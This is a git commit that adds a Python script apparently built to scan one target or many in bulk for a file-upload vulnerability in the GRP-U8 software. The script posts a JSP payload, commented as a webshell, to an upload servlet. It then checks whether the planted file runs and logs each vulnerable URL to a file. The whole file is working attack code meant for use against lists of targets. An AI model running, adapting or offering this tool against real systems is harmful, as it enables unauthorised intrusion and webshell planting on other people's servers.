a3682f921269ff44e1b0ea7d9742d393f8ebc0a7
yui14256 <fengjianyi17@gmail.com>
2024-10-11 21:15:42 +0800

    Add files via upload

---
+++ FE.py
@@ -0,0 +1,52 @@
+import sys
+import requests
+import argparse
+# 漏洞检测模块
+def checkVuln(url):
+    vulnurl = url + "/servlet/uploadAttachmentServlet"
+    okurl = url + "/hello.jsp;"
+    data = """<% out.println("hello");%>"""  # Webshell
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+               'Content-Type': 'multipart/form-data;'
+               }
+    try:
+        response = requests.get(vulnurl, headers=headers, data=data, timeout=5, verify=False)
+        if response.status_code == 200:
+            if 'hello' in requests.get(okurl, headers=headers, timeout=5, verify=False).text:
+                print(f"【+】当前网址存在漏洞：{url}")
+                with open("vuln.txt", "a+") as f:
+                    f.write(okurl + "\n")
+            else:
+                print("【-】目标网站不存在漏洞...")
+
+        else:
+            print("【-】目标网站不存在漏洞...")
+    except Exception as e:
+        print("【-】目标网址存在网络链接问题...")
+
+# 批量漏洞检测模块
+def batchCheck(filename):
+    with open(filename, "r") as f:
+        for readline in f.readlines():
+            checkVuln(readline)
+
+def banner():
+    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
+    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
+    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
+
+# 主程序方法，进行调用
+def main():
+    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@xhonger')
+    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
+    parser.add_argument('-f','--file', type=str, help='批量检测文本')
+    args = parser.parse_args()
+    if args.url:
+        checkVuln(args.url)
+    elif args.file:
+        batchCheck(args.file)
+    else:
+        banner()
+
+if __name__ == '__main__':
+    main()
